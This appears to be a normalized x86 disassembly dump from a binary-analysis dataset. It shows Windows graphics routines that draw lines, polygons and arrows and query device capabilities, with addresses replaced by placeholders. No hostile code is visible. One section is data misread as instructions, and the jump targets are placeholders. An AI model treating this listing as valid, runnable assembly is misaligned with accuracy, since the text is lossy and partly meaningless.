mov eax [ ebp - 0x25 ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
cmp ebx [ ebp + 0x1c ]
jle r-xdata
push ebp
mov al [ rw-data ]
call sub_475e04
pop ecx
mov eax [ ebp - 0x11 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xd ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x21 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x1d ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
mov eax [ ebp - 0x1d ]
cmp eax [ ebp - 0x2d ]
jge r-xdata
push ebx
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x21 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_473330
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x21 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x1d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x29 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x25 ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
sub_476194
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push esi
push edi
mov esi eax
lea edi [ ebx + 0xc0 ]
mov ecx 0x8
[ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebx + 0xc0 ]
mov ecx esi
mov eax ebx
call sub_4732dc
lea edx [ ebx + 0xc8 ]
mov ecx esi
mov eax ebx
call sub_4732dc
lea edx [ ebx + 0xd0 ]
mov ecx edi
mov eax ebx
call sub_4732dc
lea edx [ ebx + 0xd8 ]
mov ecx edi
mov eax ebx
call sub_4732dc
mov eax ebx
call sub_47320c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_476208
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_473488
mov eax [ ebx + 0xc ]
call sub_41d7e4
dec eax
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_41e234
mov ebx eax
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call MoveToEx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call LineTo
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4762d0
push ebx
mov ebx eax
cmp dl [ ebx + 0x99 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x99 ] dl
mov eax ebx
call sub_473030
mov [ ebx + 0x9a ] 0x1
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
call sub_472ccc
sub_476300
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0xc ]
mov [ ebp - 0xc ] edi
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_473488
mov eax [ ebx + 0x4 ]
call sub_41e234
mov esi eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call MoveToEx
mov [ ebp - 0xc ] edi
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_473488
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
call LineTo
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_476370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov [ ebp - 0x8 ] edi
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_473488
mov eax [ ebx + 0x4 ]
call sub_41e234
mov esi eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
call MoveToEx
mov [ ebp - 0x8 ] edi
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_473488
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
call LineTo
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4763dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov [ ebp - 0x8 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_473488
mov eax [ ebx + 0x4 ]
call sub_41e234
mov esi eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
call MoveToEx
mov [ ebp - 0x8 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_473488
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
call LineTo
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_476454
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ esp + 0x18 ]
mov edx esi
mov eax ebx
call sub_4732e8
mov eax [ esp + 0x18 ]
mov [ esp ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ esi + 0xc ]
mov eax ebx
call sub_4732e8
mov eax [ esp + 0x18 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0x18 ]
lea edx [ esi + 0x18 ]
mov eax ebx
call sub_4732e8
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x10 ]
call sub_41dadc
cmp al 0x1
je r-xdata
push 0x3
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Polygon
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx [ edi ]
mov eax [ ebx + 0x10 ]
call sub_41d9c8
sub_4764ec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
push eax
push esi
mov ecx [ edx ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_473330
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
push esi
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_473330
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push esi
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_473330
push 0x3
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Polygon
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_476558
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
fld [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
fmul [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
fld [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
fmul [ eax - 0x20 ]
faddp st1
call sub_402b00
mov [ ebx ] eax
mov eax [ ebp + 0x8 ]
fld [ eax - 0x8 ]
fchs
mov eax [ ebp + 0x8 ]
fmul [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
fld [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
fmul [ eax - 0x10 ]
faddp st1
call sub_402b00
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_4732dc
pop ebx
pop ebp
retn
sub_4765bc
push ebp
mov ebp esp
add esp 0xffffff28
push ebx
push esi
push edi
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x25 ] dl
mov [ ebp - 0x24 ] eax
mov esi [ ebp + 0x14 ]
mov ebx [ esi ]
mov eax [ ebp - 0x2c ]
sub ebx [ eax ]
mov edi [ ebp - 0x2c ]
mov edi [ edi + 0x4 ]
sub edi [ esi + 0x4 ]
mov [ ebp - 0x8c ] ebx
fild [ ebp - 0x8c ]
fmul [ r-xdata ]
mov [ ebp - 0x90 ] ebx
fild [ ebp - 0x90 ]
fmulp st1
mov [ ebp - 0x94 ] edi
fild [ ebp - 0x94 ]
fmul [ r-xdata ]
mov [ ebp - 0x98 ] edi
fild [ ebp - 0x98 ]
fmulp st1
faddp st1
fsqrt
fstp [ ebp - 0x50 ]
fwait
fld [ ebp - 0x50 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
fld [ ebp - 0x50 ]
call sub_402b00
mov edx [ ebp + 0xc ]
call sub_47695c
mov [ ebp - 0x8c ] edi
fild [ ebp - 0x8c ]
fdiv [ ebp - 0x50 ]
fstp [ ebp - 0x20 ]
fwait
mov [ ebp - 0x8c ] ebx
fild [ ebp - 0x8c ]
fdiv [ ebp - 0x50 ]
fstp [ ebp - 0x10 ]
fwait
fild [ esi ]
fmul [ ebp - 0x10 ]
fild [ esi + 0x4 ]
fmul [ ebp - 0x20 ]
fsubp st1
fstp [ ebp - 0x40 ]
fwait
fild [ esi ]
fmul [ ebp - 0x20 ]
fild [ esi + 0x4 ]
fmul [ ebp - 0x10 ]
faddp st1
fstp [ ebp - 0x48 ]
fwait
mov [ ebp - 0x8c ] eax
fild [ ebp - 0x8c ]
fsubr [ ebp - 0x40 ]
fstp [ ebp - 0x8 ]
fwait
fild [ ebp - 0x30 ]
fdiv [ r-xdata ]
fsubr [ ebp - 0x48 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_476558
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x5c ] eax
fild [ ebp - 0x30 ]
fdiv [ r-xdata ]
fadd [ ebp - 0x48 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_476558
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x2c ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x2c ]
mov edx [ edx ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0xec ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x68 ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0xec ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0xf0 ]
fild [ ebp - 0x30 ]
fdiv [ r-xdata ]
fstp [ ebp - 0x38 ]
fwait
fld [ ebp - 0x48 ]
fsub [ ebp - 0x38 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_476558
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x6c ] eax
fld [ ebp - 0x48 ]
fadd [ ebp - 0x38 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_476558
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x78 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp - 0x2c ]
fild [ eax ]
fmul [ ebp - 0x10 ]
mov eax [ ebp - 0x2c ]
fild [ eax + 0x4 ]
fmul [ ebp - 0x20 ]
fsubp st1
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x48 ]
fsub [ ebp - 0x38 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_476558
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x7c ] eax
fld [ ebp - 0x48 ]
fadd [ ebp - 0x38 ]
fstp [ ebp - 0x18 ]
fwait
push ebp
lea eax [ ebp - 0xa0 ]
call sub_476558
pop ecx
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x84 ] eax
mov eax [ esi ]
mov [ ebp - 0x58 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x54 ] eax
lea edx [ ebp - 0x58 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
call sub_4732dc
mov eax [ ebp - 0x88 ]
mov [ ebp - 0xd8 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0xd4 ] eax
mov eax [ ebp - 0x80 ]
mov [ ebp - 0xd0 ] eax
mov eax [ ebp - 0x7c ]
mov [ ebp - 0xcc ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0xc8 ] eax
mov eax [ ebp - 0x6c ]
mov [ ebp - 0xc4 ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0xc0 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0xbc ] eax
mov eax [ ebp - 0x58 ]
mov [ ebp - 0xb8 ] eax
mov eax [ ebp - 0x54 ]
mov [ ebp - 0xb4 ] eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0xb0 ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0xac ] eax
mov eax [ ebp - 0x78 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0x74 ]
mov [ ebp - 0xa4 ] eax
lea edx [ ebp - 0xd8 ]
mov ecx 0x6
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_476920
push ebp
mov ebp esp
add esp 0xfffffff8
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_476964
add esp 0xfffffff8
mov ecx [ eax ]
mov [ esp ] ecx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x4 ] ecx
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp ]
mov [ edx ] eax
mov eax [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
pop ecx
pop edx
retn
sub_476998
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4769bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4769c4
retn
sub_4769d0
inc esi
dec ecx
add dh ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add al cl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_476b0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476b14
retn
sub_4771e4
push ebp
mov ebp esp
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
mov eax ebx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4040e8
mov eax ebx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4040e8
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_477224
push ebp
mov ebp esp
add esp 0xfffffff8
mov cl 0xe8
mov edx rw-data
sub edx 0x8
inc cl
jne r-xdata
mov eax [ edx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
fld [ ebp + 0x8 ]
fcomp [ edx ]
fnstsw ax
sahf
jb r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_47726c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x18
mov esi rw-data
dec ebx
sub esi 0x8
cmp bl 0xff
jne r-xdata
mov eax ebx
jmp r-xdata
fld [ esi ]
fsub [ ebp + 0x8 ]
fabs
fcomp [ rw-data ]
fnstsw ax
sahf
jae r-xdata
mov al 0x19
pop esi
pop ebx
pop ebp
retn 0x8
sub_4772b4
push ebx
push esi
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov esi eax
push ebx
push 0x0
call ReleaseDC
mov eax esi
pop esi
pop ebx
retn
sub_4772d8
push ebx
mov ebx eax
cmp [ ebx ] 0x8
jne r-xdata
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
call sub_4772b4
push eax
push 0x48
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
call sub_4062e4
neg eax
mov [ ebx ] eax
sub_477308
push ebp
mov ebp esp
add esp 0xfffffff8
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_477357
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x8 ]
call sub_40833c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
call sub_4772d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47735e
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_477368
push ebx
mov ebx eax
mov edx ebx
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebx ]
mov edx r-xdata
call sub_4044a0
jne r-xdata
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
mov eax ebx
mov edx [ rw-data ]
add edx 0xb
call sub_4042f8
sub_4773b4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_477448
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d458
mov esi eax
call sub_477308
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d3e4
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_477368
mov edx [ ebp - 0x8 ]
pop eax
call sub_4044a0
jne r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47744f
lea eax [ ebp - 0x8 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41d494
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
call sub_41d4fc
cmp al 0x1
je r-xdata
mov al 0x1
sub_47745c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4774d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d000
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_477368
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d3fc
call sub_477308
mov edx eax
mov eax ebx
call sub_41d474
xor edx edx
mov eax ebx
call sub_41d1d4
mov dl [ r-xdata ]
mov eax ebx
call sub_41d4a0
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4774dd
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_477504
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_47756f
push [ fs : edx ]
mov [ fs : edx ] esp
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
cmp eax 0x168
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477576
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_47757c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
mov [ ebx + 0x288 ] eax
xor edx edx
mov eax ebx
call sub_42ec74
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov edx 0x190
mov eax ebx
call sub_441d0c
mov edx 0xfa
mov eax ebx
call sub_441d30
mov [ ebx + 0x228 ] 0xf
mov [ ebx + 0x28c ] 0x0
mov [ ebx + 0x22c ] 0x1
mov eax [ ebx + 0x208 ]
mov [ ebx + 0x250 ] eax
mov [ ebx + 0x278 ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_472c6c
mov [ ebx + 0x27c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_472fc8
mov esi eax
mov [ ebx + 0x288 ] esi
mov edx [ ebx + 0x250 ]
mov eax esi
call sub_472dfc
push 0x4
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x3
mov edx 0x4
mov eax 0x3
call sub_412f04
lea esi [ ebp - 0x14 ]
lea edi [ ebx + 0x258 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebx + 0x270 ] 0x0
mov [ ebx + 0x271 ] 0x1
xor eax eax
mov [ ebx + 0x274 ] eax
push 0xf
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0xf
mov edx 0xf
mov eax 0xf
call sub_412f04
lea esi [ ebp - 0x14 ]
lea edi [ ebx + 0x29e ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ax [ ebx + 0x78 ]
mov [ ebx + 0x268 ] ax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x284 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x26c ] eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov [ ebx + 0x28c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
mov [ rw-data ] al
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_477704
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x288 ]
call sub_40d6a0
mov eax [ esi + 0x27c ]
call sub_403344
mov eax [ esi + 0x284 ]
call sub_403344
mov eax [ esi + 0x26c ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44aaa8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_47779c
push ebx
push esi
push edi
add esp 0xffffffe4
mov [ esp ] ecx
mov edi edx
mov ebx eax
mov eax [ ebx + 0x70 ]
push eax
mov al [ ebx + 0x278 ]
push eax
mov eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x27c ]
mov edx edi
mov eax [ ebx + 0x288 ]
mov esi [ eax ]
call [ esi + 0xa8 ]
push edi
lea esi [ esp + 0x10 ]
lea edi [ ebx + 0x22d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
lea eax [ ebx + 0x22d ]
call sub_4729f8
lea esi [ ebx + 0x22d ]
push 0x64
mov eax [ esp + 0xc ]
push eax
mov edx 0x3
mov eax ebx
call sub_477d20
push eax
call sub_4062e4
